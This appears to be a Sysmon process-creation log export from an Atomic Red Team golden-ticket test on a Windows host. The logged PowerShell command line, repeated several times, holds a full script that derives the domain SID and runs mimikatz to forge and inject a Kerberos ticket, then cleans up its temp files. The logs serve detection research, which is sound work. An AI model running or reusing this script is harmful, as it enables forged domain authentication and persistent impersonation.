Microsoft-Windows-Sysmon/Operational,C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\golden.bat,Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Windows Command Processor,,,,,,,1,9468,,10.0.22621.1635 (WinBuild.160101.0800),"MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,,Medium,0x8000000000000000,Information,{fda94052-43a9-658d-2520-cd0000000000},0xcd2025,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:13.488

ProcessGuid: {fda94052-43a9-658d-7002-000000000b00}

ProcessId: 8144

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\golden.bat

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-43a9-658d-2520-cd0000000000}

LogonId: 0xCD2025

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-43a9-658d-6d02-000000000b00}

ParentProcessId: 4172

ParentImage: C:\Windows\System32\runas.exe

ParentCommandLine: ""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\golden.bat

ParentUser: WINDEV2309EVAL\User",Info,Cmd.Exe,"""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\golden.bat",C:\Windows\System32\runas.exe,{fda94052-43a9-658d-6d02-000000000b00},4172,WINDEV2309EVAL\User,{fda94052-43a9-658d-7002-000000000b00},7044,8144,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:45:13.4894982Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:45:13.488,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:45:13.4894982Z""/>
      <EventRecordID>9468</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:45:13.488</Data>
      <Data Name=""ProcessGuid"">{fda94052-43a9-658d-7002-000000000b00}</Data>
      <Data Name=""ProcessId"">8144</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1635 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\golden.bat</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-43a9-658d-2520-cd0000000000}</Data>
      <Data Name=""LogonId"">0xcd2025</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-43a9-658d-6d02-000000000b00}</Data>
      <Data Name=""ParentProcessId"">4172</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\runas.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\golden.bat</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:13.488

ProcessGuid: {fda94052-43a9-658d-7002-000000000b00}

ProcessId: 8144

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\golden.bat

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-43a9-658d-2520-cd0000000000}

LogonId: 0xCD2025

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-43a9-658d-6d02-000000000b00}

ParentProcessId: 4172

ParentImage: C:\Windows\System32\runas.exe

ParentCommandLine: ""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\golden.bat

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,C:\Windows\system32\svchost.exe -k netsvcs -p -s seclogon,Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Host Process for Windows Services,,,,,,,1,9467,,10.0.22621.1 (WinBuild.160101.0800),"MD5=8EC922C7A58A8701AB481B7BE9644536,SHA256=949BFB5B4C7D58D92F3F9C5F8EC7CA4CEAFFD10EC5F0020F0A987C472D61C54B,IMPHASH=76B4BAE80D2C3B08BB062D97BF9CA791",C:\Windows\System32\svchost.exe,,System,0x8000000000000000,Information,{fda94052-34eb-658d-e703-000000000000},0x3e7,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:13.349

ProcessGuid: {fda94052-43a9-658d-6f02-000000000b00}

ProcessId: 10384

Image: C:\Windows\System32\svchost.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Host Process for Windows Services

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: svchost.exe

CommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s seclogon

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=8EC922C7A58A8701AB481B7BE9644536,SHA256=949BFB5B4C7D58D92F3F9C5F8EC7CA4CEAFFD10EC5F0020F0A987C472D61C54B,IMPHASH=76B4BAE80D2C3B08BB062D97BF9CA791

ParentProcessGuid: {fda94052-34eb-658d-0b00-000000000b00}

ParentProcessId: 788

ParentImage: C:\Windows\System32\services.exe

ParentCommandLine: C:\Windows\system32\services.exe

ParentUser: NT AUTHORITY\SYSTEM",Info,svchost.exe,C:\Windows\system32\services.exe,C:\Windows\System32\services.exe,{fda94052-34eb-658d-0b00-000000000b00},788,NT AUTHORITY\SYSTEM,{fda94052-43a9-658d-6f02-000000000b00},7044,10384,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:45:13.3504406Z,,,Process Create (rule: ProcessCreate),0,6672,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-28 09:45:13.349,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:45:13.3504406Z""/>
      <EventRecordID>9467</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:45:13.349</Data>
      <Data Name=""ProcessGuid"">{fda94052-43a9-658d-6f02-000000000b00}</Data>
      <Data Name=""ProcessId"">10384</Data>
      <Data Name=""Image"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Host Process for Windows Services</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">svchost.exe</Data>
      <Data Name=""CommandLine"">C:\Windows\system32\svchost.exe -k netsvcs -p -s seclogon</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
      <Data Name=""LogonGuid"">{fda94052-34eb-658d-e703-000000000000}</Data>
      <Data Name=""LogonId"">0x3e7</Data>
      <Data Name=""TerminalSessionId"">0</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=8EC922C7A58A8701AB481B7BE9644536,SHA256=949BFB5B4C7D58D92F3F9C5F8EC7CA4CEAFFD10EC5F0020F0A987C472D61C54B,IMPHASH=76B4BAE80D2C3B08BB062D97BF9CA791</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-34eb-658d-0b00-000000000b00}</Data>
      <Data Name=""ParentProcessId"">788</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\services.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\services.exe</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:13.349

ProcessGuid: {fda94052-43a9-658d-6f02-000000000b00}

ProcessId: 10384

Image: C:\Windows\System32\svchost.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Host Process for Windows Services

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: svchost.exe

CommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s seclogon

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=8EC922C7A58A8701AB481B7BE9644536,SHA256=949BFB5B4C7D58D92F3F9C5F8EC7CA4CEAFFD10EC5F0020F0A987C472D61C54B,IMPHASH=76B4BAE80D2C3B08BB062D97BF9CA791

ParentProcessGuid: {fda94052-34eb-658d-0b00-000000000b00}

ParentProcessId: 788

ParentImage: C:\Windows\System32\services.exe

ParentCommandLine: C:\Windows\system32\services.exe

ParentUser: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,C:\Windows\system32\vssvc.exe,Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Microsoft® Volume Shadow Copy Service,,,,,,,1,9466,,10.0.22621.1 (WinBuild.160101.0800),"MD5=E41824427731D3933591BCD216674818,SHA256=321120DE419B488B6EB0D9F32E733756FE9E97689FC0FE7FD2C9BF50AFB1BCC4,IMPHASH=BC0F5315EEA41E76B544E9F6ACFE1FEE",C:\Windows\System32\VSSVC.exe,,System,0x8000000000000000,Information,{fda94052-34eb-658d-e703-000000000000},0x3e7,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:13.238

ProcessGuid: {fda94052-43a9-658d-6c02-000000000b00}

ProcessId: 6836

Image: C:\Windows\System32\VSSVC.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Microsoft® Volume Shadow Copy Service

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: VSSVC.EXE

CommandLine: C:\Windows\system32\vssvc.exe

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=E41824427731D3933591BCD216674818,SHA256=321120DE419B488B6EB0D9F32E733756FE9E97689FC0FE7FD2C9BF50AFB1BCC4,IMPHASH=BC0F5315EEA41E76B544E9F6ACFE1FEE

ParentProcessGuid: {fda94052-34eb-658d-0b00-000000000b00}

ParentProcessId: 788

ParentImage: C:\Windows\System32\services.exe

ParentCommandLine: C:\Windows\system32\services.exe

ParentUser: NT AUTHORITY\SYSTEM",Info,VSSVC.EXE,C:\Windows\system32\services.exe,C:\Windows\System32\services.exe,{fda94052-34eb-658d-0b00-000000000b00},788,NT AUTHORITY\SYSTEM,{fda94052-43a9-658d-6c02-000000000b00},7044,6836,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:45:13.2512199Z,,,Process Create (rule: ProcessCreate),0,6672,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-28 09:45:13.238,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:45:13.2512199Z""/>
      <EventRecordID>9466</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:45:13.238</Data>
      <Data Name=""ProcessGuid"">{fda94052-43a9-658d-6c02-000000000b00}</Data>
      <Data Name=""ProcessId"">6836</Data>
      <Data Name=""Image"">C:\Windows\System32\VSSVC.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Microsoft&#174; Volume Shadow Copy Service</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">VSSVC.EXE</Data>
      <Data Name=""CommandLine"">C:\Windows\system32\vssvc.exe</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
      <Data Name=""LogonGuid"">{fda94052-34eb-658d-e703-000000000000}</Data>
      <Data Name=""LogonId"">0x3e7</Data>
      <Data Name=""TerminalSessionId"">0</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=E41824427731D3933591BCD216674818,SHA256=321120DE419B488B6EB0D9F32E733756FE9E97689FC0FE7FD2C9BF50AFB1BCC4,IMPHASH=BC0F5315EEA41E76B544E9F6ACFE1FEE</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-34eb-658d-0b00-000000000b00}</Data>
      <Data Name=""ParentProcessId"">788</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\services.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\services.exe</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:13.238

ProcessGuid: {fda94052-43a9-658d-6c02-000000000b00}

ProcessId: 6836

Image: C:\Windows\System32\VSSVC.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Microsoft&#174; Volume Shadow Copy Service

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: VSSVC.EXE

CommandLine: C:\Windows\system32\vssvc.exe

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=E41824427731D3933591BCD216674818,SHA256=321120DE419B488B6EB0D9F32E733756FE9E97689FC0FE7FD2C9BF50AFB1BCC4,IMPHASH=BC0F5315EEA41E76B544E9F6ACFE1FEE

ParentProcessGuid: {fda94052-34eb-658d-0b00-000000000b00}

ParentProcessId: 788

ParentImage: C:\Windows\System32\services.exe

ParentCommandLine: C:\Windows\system32\services.exe

ParentUser: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\golden.bat",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Run As Utility,,,,,,,1,9465,,10.0.22621.1 (WinBuild.160101.0800),"MD5=AB7024BDCBC308CE40ADE31373D2719A,SHA256=2E889BA98EB18739E33BB28412F2D4E847BB2B56CBD74D0A4488FF5F9C756BDE,IMPHASH=E9DF230F3CED78C5C775014DECE4BA58",C:\Windows\System32\runas.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:13.245

ProcessGuid: {fda94052-43a9-658d-6d02-000000000b00}

ProcessId: 4172

Image: C:\Windows\System32\runas.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Run As Utility

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: RUNAS.EXE

CommandLine: ""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\golden.bat

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=AB7024BDCBC308CE40ADE31373D2719A,SHA256=2E889BA98EB18739E33BB28412F2D4E847BB2B56CBD74D0A4488FF5F9C756BDE,IMPHASH=E9DF230F3CED78C5C775014DECE4BA58

ParentProcessGuid: {fda94052-43a7-658d-6a02-000000000b00}

ParentProcessId: 5508

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = \""""S-1-5-21-DEFAULT\""""
If ($domain_sid -Match \""""DEFAULT\"""") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
>%TEMP%\golden.txt 2>&1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe \""""kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:goldenticketfakeuser /ptt\"""" \""""exit\""""

  echo.
  echo Requesting SYSVOL:
  dir \\%userdnsdomain%\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
\""""@ -Replace \""""DOMAIN_SID\"""", $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\golden.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\golden.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore}

ParentUser: WINDEV2309EVAL\User",Info,RUNAS.EXE,"""powershell.exe"" & {Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = \""""S-1-5-21-DEFAULT\""""
If ($domain_sid -Match \""""DEFAULT\"""") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
>%TEMP%\golden.txt 2>&1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe \""""kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:goldenticketfakeuser /ptt\"""" \""""exit\""""

  echo.
  echo Requesting SYSVOL:
  dir \\%userdnsdomain%\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
\""""@ -Replace \""""DOMAIN_SID\"""", $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\golden.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\golden.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-43a7-658d-6a02-000000000b00},5508,WINDEV2309EVAL\User,{fda94052-43a9-658d-6d02-000000000b00},7044,4172,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:45:13.2477081Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:45:13.245,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:45:13.2477081Z""/>
      <EventRecordID>9465</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:45:13.245</Data>
      <Data Name=""ProcessGuid"">{fda94052-43a9-658d-6d02-000000000b00}</Data>
      <Data Name=""ProcessId"">4172</Data>
      <Data Name=""Image"">C:\Windows\System32\runas.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Run As Utility</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">RUNAS.EXE</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\golden.bat</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=AB7024BDCBC308CE40ADE31373D2719A,SHA256=2E889BA98EB18739E33BB28412F2D4E847BB2B56CBD74D0A4488FF5F9C756BDE,IMPHASH=E9DF230F3CED78C5C775014DECE4BA58</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-43a7-658d-6a02-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5508</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = \""""S-1-5-21-DEFAULT\""""
If ($domain_sid -Match \""""DEFAULT\"""") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
&gt;%TEMP%\golden.txt 2&gt;&amp;1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe \""""kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:goldenticketfakeuser /ptt\"""" \""""exit\""""

  echo.
  echo Requesting SYSVOL:
  dir \\%userdnsdomain%\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
\""""@ -Replace \""""DOMAIN_SID\"""", $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\golden.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\golden.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:13.245

ProcessGuid: {fda94052-43a9-658d-6d02-000000000b00}

ProcessId: 4172

Image: C:\Windows\System32\runas.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Run As Utility

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: RUNAS.EXE

